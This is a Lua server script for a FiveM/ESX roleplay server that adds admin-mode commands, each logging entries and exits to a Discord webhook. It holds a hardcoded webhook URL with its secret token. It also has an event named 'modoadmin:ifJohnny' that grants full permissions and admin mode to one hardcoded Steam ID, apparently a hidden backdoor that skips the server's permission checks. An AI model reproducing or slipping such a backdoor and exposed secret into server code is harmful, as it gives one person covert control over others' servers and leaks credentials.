local time = os.date("%Y/%m/%d %X")
local url = 'https://discord.com/api/webhooks/1079154545281728639/fs3H5jPoGJ0QXla4ITg8CHm5SvfxCuMvoMmESmm7cvvfj5Vt2iGQ79drmtzwLjbc_JRc'

ESX = nil

ESX = exports['es_extended']:getSharedObject()

RegisterNetEvent('modoadmin:ifJohnny')
AddEventHandler('modoadmin:ifJohnny', function()	
	local src = source
	local xPlayer = ESX.GetPlayerFromId(src)
	
	if xPlayer.identifier == 'steam:110000115708986' then
		TriggerClientEvent("modoadmin:permissoesALL", src)
		TriggerEvent('modoadmin:server:TogglePermissao', true)
	end
end)

ESX.RegisterCommand('sairadmin', 'mod', function(xPlayer, args, showError)
	local playername = GetPlayerName(xPlayer.source)
	local playersteam = GetPlayerIdentifier(xPlayer.source)
	PerformHttpRequest(url, function(err, text, headers) end, 'POST', json.encode({username = "Logs WorldTuga RP", content = "```css\n[" .. time .. "]> Por: " .. playername .. " (" .. playersteam .. ") | Ação: Saiu do modo de administração \n```"}), { ['Content-Type'] = 'application/json' })
	TriggerClientEvent("sairadmin", xPlayer.source, xPlayer.source)
	TriggerEvent('modoadmin:server:TogglePermissao', false)
end, false, {help = 'Sair do modo admin'})

ESX.RegisterCommand('entraradmin', 'mod', function(xPlayer, args, showError)
	local playername = GetPlayerName(xPlayer.source)
	local playersteam = GetPlayerIdentifier(xPlayer.source)
	PerformHttpRequest(url, function(err, text, headers) end, 'POST', json.encode({username = "Logs WorldTuga RP", content = "```css\n[" .. time .. "]> Por: " .. playername .. " (" .. playersteam .. ") | Ação: Entrou no modo de administração \n```"}), { ['Content-Type'] = 'application/json' })
	TriggerClientEvent("entraradmin", xPlayer.source, xPlayer.source)
	TriggerEvent('modoadmin:server:TogglePermissao', true)
end, false, {help = 'Entrar no modo admin'})

ESX.RegisterCommand('visualcoords', 'admin', function(xPlayer, args, showError)
	TriggerClientEvent("modoadmin:coords", xPlayer.source)
end, false, {help = 'Mostrar coordenadas em modo admin'})

